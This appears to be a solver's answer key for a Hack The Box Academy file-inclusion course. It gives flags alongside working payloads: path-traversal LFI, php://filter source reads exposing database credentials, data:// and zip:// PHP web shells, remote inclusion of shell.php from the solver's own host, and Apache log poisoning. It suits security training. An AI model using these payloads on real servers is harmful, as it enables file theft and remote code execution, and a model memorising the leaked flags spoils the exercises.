# Local File Inclusion

1. Using the file inclusion find the name of a user on the system that starts with "b".

Answer: barry

Explanation: in parameter language input the path - ../../../../../etc/passwd

2. Submit the contents of the flag.txt file located in the /usr/share/flags directory.

Answer: HTB{n3v3r_tru$t_u$3r_!nput} 

Explanation: /index.php?language=../../../../../usr/share/flags/flag.txt

# Basic Bypasses

1.  The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt

Answer: HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}

Explanation: http://94.237.54.42:46178/index.php?language=languages//....//....//....//....//flag.txt

# PHP Filters

1. Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

Answer: HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}

Explanation:

Command: ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.54.116:44613/FUZZ.php

Request: GET /index.php?language=php://filter/read=convert.base64-encode/resource=configure HTTP/1.1

```
PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7
```
```
<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";
```

# PHP Wrappers

Answer: HTB{d!$46l3_r3m0t3_url_!nclud3}

Explanation: http://94.237.53.117:41895/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt

# Remote File Inclusion (RFI)

Answer: 99a8fc05f033f2fc0cf9a6f9826f83f4

Explanation: http://10.129.99.147/index.php?language=http://10.10.15.34:8080/shell.php&cmd=cat%20/exercise/flag.txt

# LFI and File Upload

Answer: HTB{upl04d+lf!+3x3cut3=rc3} 
Explanation: 
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

http://94.237.50.242:47405/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt

# Log Poisoning

Answer: /var/www/html

Explanation: 
Request: 
```
GET /index.php?language=/var/log/apache2/access.log&cmd=pwd HTTP/1.1
Host: 94.237.53.117:48631
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.53.117:48631/
DNT: 1
Connection: close
Cookie: PHPSESSID=7r7og4mnk3jh40renhtg3m56u9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Answer: HTB{1095_5#0u1d_n3v3r_63_3xp053d}

Request part:
```
GET /index.php?language=/var/log/apache2/access.log&cmd=cat%20/c85ee5082f4c723ace6c0796e3a3db09.txt HTTP/1.1
Host: 94.237.53.117:48631
```

# Automated Scanning

Answer: HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}

Explanation: 
```
ffuf -w /usr/share/wordlists/seclists/Discovery//Web-Content/burp-parameter-names.txt:FUZZ  -u 'http://94.237.54.208:36613/index.php?FUZZ=value' -fs 2309

```
```
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.54.208:36613/index.php?view=FUZZ' -fs 1935
```
```
http://94.237.54.208:36613/index.php?view=../../../../../../../../../../../../../../../../../flag.txt
```
# Find Inclusion Prevention

```
find / -name "php.ini"
```

Answer: /etc/php/7.4/apache2/php.ini

# Skills Assessment

```
GET /index.php?page=php://filter/read=convert.base64-encode/resource=index HTTP/1.1
```
Decoder Base64 in index file:
```
<?php 
		  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
		?>
```
```
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt HTTP/1.1
```


